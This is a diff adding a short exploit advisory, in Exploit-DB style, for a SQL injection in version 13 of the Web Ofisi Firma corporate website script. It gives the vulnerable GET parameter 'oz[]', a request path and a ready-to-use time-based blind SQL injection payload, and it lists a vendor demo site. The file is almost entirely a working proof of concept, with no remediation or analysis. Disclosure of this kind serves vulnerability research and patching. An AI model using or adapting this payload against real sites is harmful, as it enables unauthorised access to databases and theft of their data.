@@ -1,0 +1,13 @@
+# Exploit Title: Web Ofisi Firma 13 - 'oz' SQL Injection
+# Date: 2019-07-19
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor: https://www.web-ofisi.com/detay/kurumsal-firma-v13-sinirsiz-dil.html
+# Demo Site: http://demobul.net/firmav13/
+# Version: v13
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC: SQLi -----
+Request: http://localhost/[PATH]/kategori/ikinci-el-klima.html?oz[]=1_1
+Vulnerable Parameters: oz[] (GET)
+Payload: 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
